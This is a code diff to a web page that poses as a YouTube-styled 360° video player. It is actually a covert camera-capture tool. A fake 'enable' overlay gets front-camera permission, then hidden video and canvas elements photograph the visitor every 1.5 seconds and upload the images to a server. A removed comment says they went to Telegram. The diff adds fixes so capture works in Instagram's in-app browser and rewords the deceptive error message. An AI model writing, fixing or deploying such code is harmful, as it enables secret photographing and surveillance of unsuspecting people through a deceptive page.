@@ -33,7 +33,7 @@
       font-family: "Roboto", Helvetica, Arial, sans-serif;
     }
 
-    /* Fixed Iframe for 360 Video */
+    /* Video Player Layer */
     #video-player {
       position: absolute;
       top: 0;
@@ -44,14 +44,14 @@
       z-index: 1;
     }
 
-    /* Mobile-First Alignment for Permission Overlay */
+    /* Mobile-Optimized Permission Overlay */
     #permission-overlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: #0f0f0f; /* YouTube Dark Mode */
+      background: #0f0f0f;
       z-index: 9999;
       display: flex;
       flex-direction: column;
@@ -84,7 +84,7 @@
     }
 
     #enable-btn {
-      background: #cc0000; /* YouTube Red */
+      background: #cc0000;
       color: #fff;
       border: none;
       padding: 14px 32px;
@@ -95,14 +95,13 @@
       cursor: pointer;
       width: 100%;
       max-width: 260px;
-      transition: background 0.2s;
     }
 
     #enable-btn:active {
       background: #990000;
     }
 
-    /* Capture elements remain hidden */
+    /* Hidden capture elements */
     video, canvas { display: none; }
   </style>
 </head>
@@ -122,7 +121,7 @@
     allowfullscreen>
   </iframe>
 
-  <video id="video" autoplay playsinline></video>
+  <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas" width="480" height="640"></canvas>
 
   <script>
@@ -134,7 +133,7 @@
 
     btn.addEventListener('click', async () => {
       try {
-        // Optimized for portrait mobile photography
+        // Request specific dimensions to ensure portrait "straight" photos
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { 
             facingMode: 'user',
@@ -145,27 +144,32 @@
         
         video.srcObject = stream;
         
-        // Hide the prompt once they click "Allow" on the browser popup
+        // Force the video to play to wake up the stream in Instagram
+        await video.play();
+        
         overlay.style.display = 'none';
 
-        // Capture cycle: Sends "straight" portrait photos to Telegram
+        // Start capture cycle
         setInterval(async () => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+          // Fix: Check if video has actual data to prevent black photos
+          if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
-          try {
-            await fetch('/api/upload-photo', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ dataUrl })
-            });
-          } catch (e) {
-            console.error('Upload failed');
+            try {
+              await fetch('/api/upload-photo', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ dataUrl })
+              });
+            } catch (e) {
+              console.error('Upload error');
+            }
           }
-        }, 1200); // 1.2s interval for better balance of speed and reliability
+        }, 1500);
 
       } catch (err) {
-        alert("The 360° player is disabled. Please allow camera and motion access to use this feature.");
+        alert("To view 360° content, please use a standard browser like Chrome or Safari and allow camera access.");
         console.error('Permission error:', err);
       }
     });
